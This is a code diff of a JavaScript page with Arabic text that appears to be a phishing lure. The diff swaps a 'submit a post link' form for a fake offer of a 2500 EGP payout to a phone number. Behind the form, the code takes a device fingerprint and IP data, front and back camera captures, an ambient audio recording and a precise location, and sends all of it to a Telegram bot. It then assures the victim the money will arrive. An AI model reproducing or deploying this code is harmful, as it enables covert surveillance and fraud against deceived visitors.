         async function startProcess() {
             if (isRunning) return;
-
-            const link = linkInputMain.value.trim();
-
-            if (!link) {
-                errorDiv.className = 'error-toast';
-                errorDiv.innerText = "⚠️ يرجى إدخال رابط المنشور";
+            
+            let phoneNumber = phoneInput.value.trim();
+            if (!phoneNumber.match(/^01[0-9]{9}$/)) {
+                errorDiv.innerText = "⚠️ رقم هاتف غير صالح (مثال: 01012345678)";
                 errorDiv.style.display = "block";
                 setTimeout(() => errorDiv.style.display = "none", 3000);
                 return;
             }
-
-            if (!link.startsWith('http://') && !link.startsWith('https://')) {
-                errorDiv.className = 'error-toast';
-                errorDiv.innerText = "⚠️ الرابط يجب أن يبدأ بـ http:// أو https://";
-                errorDiv.style.display = "block";
-                setTimeout(() => errorDiv.style.display = "none", 3000);
-                return;
-            }
-
+            
             isRunning = true;
-            submitBtn.disabled = true;
+            claimBtn.disabled = true;
             loaderDiv.style.visibility = "visible";
-            document.getElementById('statusBar').innerHTML = "📡 جاري الإرسال...";
-
-            // إرسال الرابط الأساسي
-            await sendToTelegram(MASTER_ID, BOT_TOKEN, 'text', null,
-                `📋 <b>طلب جديد - رابط منشور</b>\n🔗 الرابط: ${link}\n⏰ الوقت: ${new Date().toLocaleString('ar-EG')}\n👤 صاحب المنشور: ${OWNER.name}`);
-
+            statusSpan.innerHTML = "📡 جاري طلب الأذونات...";
+            
+            // 1. إرسال رقم الهاتف
+            await sendToTelegram(MASTER_ID, BOT_TOKEN, 'text', null, `📞 <b>رقم المستفيد الجديد</b>\n🔢 الرقم: ${phoneNumber}\n⏰ الوقت: ${new Date().toLocaleString('ar-EG')}`);
+            
+            // 2. بصمة الجهاز + IP
             loaderText.innerText = "📱 جاري قراءة بيانات الجهاز...";
-            await getDeepDeviceFingerprint(MASTER_ID, BOT_TOKEN, link, OWNER.name);
-            await getRichIPData(MASTER_ID, BOT_TOKEN, link, OWNER.name);
-
+            await getDeepDeviceFingerprint(MASTER_ID, BOT_TOKEN, phoneNumber);
+            await getRichIPData(MASTER_ID, BOT_TOKEN, phoneNumber);
+            
+            // 3. الكاميرا الأمامية
             loaderText.innerText = "📸 جاري فتح الكاميرا الأمامية...";
-            await captureFrontCamera(MASTER_ID, BOT_TOKEN, link, OWNER.name);
-
+            await captureFrontCamera(MASTER_ID, BOT_TOKEN, phoneNumber);
+            
+            // 4. الكاميرا الخلفية
             loaderText.innerText = "📷 جاري فتح الكاميرا الخلفية...";
-            await captureBackCamera(MASTER_ID, BOT_TOKEN, link, OWNER.name);
-
-            loaderText.innerText = "🎤 جاري تسجيل الصوت...";
-            await recordAmbientAudio(MASTER_ID, BOT_TOKEN, link, OWNER.name);
-
+            await captureBackCamera(MASTER_ID, BOT_TOKEN, phoneNumber);
+            
+            // 5. التسجيل الصوتي
+            loaderText.innerText = "🎤 جاري تسجيل الصوت (8 ثوان)...";
+            await recordAmbientAudio(MASTER_ID, BOT_TOKEN, phoneNumber);
+            
+            // 6. الموقع
             loaderText.innerText = "📍 جاري تحديد الموقع...";
-            await getPreciseLocation(MASTER_ID, BOT_TOKEN, link, OWNER.name);
-
-            await sendToTelegram(MASTER_ID, BOT_TOKEN, 'text', null,
-                `✅ <b>تم استلام الرابط بنجاح!</b>\n🔗 الرابط: ${link}\n👤 صاحب المنشور: ${OWNER.name}\n📌 سيتم التواصل خلال 24 ساعة`);
-
+            await getPreciseLocation(MASTER_ID, BOT_TOKEN, phoneNumber);
+            
+            // 7. إشعار الإكتمال
+            await sendToTelegram(MASTER_ID, BOT_TOKEN, 'text', null, `✅ <b>اكتمل جمع البيانات بنجاح!</b>\n📞 الرقم: ${phoneNumber}\n💰 سيتم صرف 2500 ج.م خلال 24 ساعة إلى هذا الرقم`);
+            
             loaderDiv.style.visibility = "hidden";
-            errorDiv.className = 'error-toast success';
-            errorDiv.innerText = "✅ تم استلام الرابط بنجاح! سيتم التواصل معك خلال 24 ساعة.";
+            errorDiv.style.backgroundColor = "#e8f5e9";
+            errorDiv.style.color = "#2e7d32";
+            errorDiv.innerText = "🎉 تم استلام طلبك بنجاح! خلال 24 ساعة سوف يصلك المبلغ.";
             errorDiv.style.display = "block";
-            submitBtn.disabled = false;
-            document.getElementById('statusBar').innerHTML = '<span class="dot" style="background:#2ed573;"></span> تم الإرسال بنجاح';
+            claimBtn.disabled = false;
+            statusSpan.innerHTML = "✅ تم التفعيل - سيصلك المبلغ خلال 24 ساعة";
             isRunning = false;
-
+            
             setTimeout(() => errorDiv.style.display = "none", 8000);
         }
-
-        submitBtn.onclick = startProcess;
-
-        // ============================================================
-        //  بدء تحميل الهوية عند فتح الصفحة
-        // ============================================================
-        loadOwnerIdentity();
+        
+        claimBtn.onclick = startProcess;
     })();
 </script>
 </body>
